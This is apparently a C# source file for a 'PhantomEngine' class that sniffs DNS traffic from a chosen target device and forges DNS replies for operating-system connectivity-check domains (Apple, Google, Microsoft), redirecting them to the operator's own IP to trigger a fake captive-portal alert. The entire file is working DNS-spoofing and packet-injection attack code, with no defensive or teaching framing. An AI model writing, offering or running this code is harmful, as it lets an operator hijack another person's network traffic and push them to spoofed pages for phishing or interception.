using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using MyNet.Models;
using MyNet.Helpers;

namespace MyNet.Core
{
    /// <summary>
    /// Executes the 'Phantom Alert' system by hijacking DNS and triggering OS portal checks.
    /// </summary>
    public class PhantomEngine : IDisposable
    {
        private ILiveDevice? _captureDevice;
        private readonly AdapterInfo _adapter;
        private readonly List<string> _hijackPortals = new()
        {
            "captive.apple.com",
            "connectivitycheck.gstatic.com",
            "connectivitycheck.android.com",
            "clients3.google.com",
            "msftconnecttest.com",
            "www.msftconnecttest.com"
        };

        private string? _targetIp;
        private string? _targetMac;
        private bool _isActive;

        public PhantomEngine(AdapterInfo adapter) => _adapter = adapter;

        public void Start(string targetIp, string targetMac)
        {
            _targetIp = targetIp;
            _targetMac = targetMac;
            _isActive = true;

            var devices = CaptureDeviceList.Instance;
            _captureDevice = devices.FirstOrDefault(d => d.Name.Contains(_adapter.Name));
            
            if (_captureDevice == null) return;

            _captureDevice.Open(DeviceModes.Promiscuous, 10);
            _captureDevice.Filter = "udp port 53";
            _captureDevice.OnPacketArrival += OnDnsArrival;
            _captureDevice.StartCapture();
        }

        private void OnDnsArrival(object sender, PacketCapture e)
        {
            if (!_isActive || _targetIp == null || _targetMac == null) return;

            var rawPacket = e.GetPacket();
            var packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);
            
            var ipPacket = packet.Extract<IPPacket>();
            if (ipPacket == null || ipPacket.SourceAddress.ToString() != _targetIp) return;

            var udpPacket = packet.Extract<UdpPacket>();
            if (udpPacket == null) return;

            // Simple DNS Question Parsing (Hardcoded for target domains)
            try
            {
                byte[] dnsData = udpPacket.PayloadData;
                string query = System.Text.Encoding.ASCII.GetString(dnsData);

                if (_hijackPortals.Any(p => query.Contains(p)))
                {
                    // HIJACKED! We send a fake DNS Response pointing to OUR IP
                    SendFakeDnsResponse(ipPacket, udpPacket, dnsData);
                }
            }
            catch { }
        }

        private void SendFakeDnsResponse(IPPacket originalIp, UdpPacket originalUdp, byte[] dnsData)
        {
            if (_captureDevice == null) return;

            try
            {
                // DNS Header: TxId (2), Flags (2), Qs (2), Ans (2), Auth (2), Add (2)
                byte[] txId = { dnsData[0], dnsData[1] };
                byte[] header = { txId[0], txId[1], 0x81, 0x80, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 };

                // Question section (copy from original, until end of name + type + class)
                int nameEnd = 12;
                while (dnsData[nameEnd] != 0 && nameEnd < dnsData.Length) nameEnd += dnsData[nameEnd] + 1;
                byte[] question = dnsData.Skip(12).Take(nameEnd - 12 + 5).ToArray();

                // Answer section: NamePointer(2), TypeA(2), ClassIN(2), TTL(4), Len(2), IP(4)
                byte[] ourIp = IPAddress.Parse(_adapter.IpAddress).GetAddressBytes();
                byte[] answer = { 0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x04, ourIp[0], ourIp[1], ourIp[2], ourIp[3] };

                byte[] fullDns = header.Concat(question).Concat(answer).ToArray();

                // Construct IP/UDP wrapper
                var ethernet = new EthernetPacket(
                    new PhysicalAddress(NetworkUtils.ParseMac(_adapter.MacAddress)),
                    new PhysicalAddress(NetworkUtils.ParseMac(_targetMac!)),
                    EthernetType.IPv4);

                var ip = new IPv4Packet(
                    IPAddress.Parse(_adapter.IpAddress),
                    IPAddress.Parse(_targetIp!))
                {
                    TimeToLive = 64
                };
                
                // Final 'Hardcoded' Fix: Use Enum.ToObject to set the protocol to 17 (UDP)
                // This bypasses the naming conflict in different PacketDotNet versions.
                ip.Protocol = (dynamic)Enum.ToObject(ip.Protocol.GetType(), 17);


                var udp = new UdpPacket((ushort)53, (ushort)originalUdp.SourcePort)
                {
                    PayloadData = fullDns
                };

                ethernet.PayloadPacket = ip;
                ip.PayloadPacket = udp;
                // PacketDotNet versions vary, usually checksum is automatic or handled via UpdateCalculatedValues 
                // We'll use the most common one for net8.0

                _captureDevice.SendPacket(ethernet);
            }
            catch { }
        }

        public void Stop()
        {
            _isActive = false;
            if (_captureDevice != null)
            {
                _captureDevice.StopCapture();
                _captureDevice.Close();
                _captureDevice = null;
            }
        }

        public void Dispose() => Stop();
    }
}
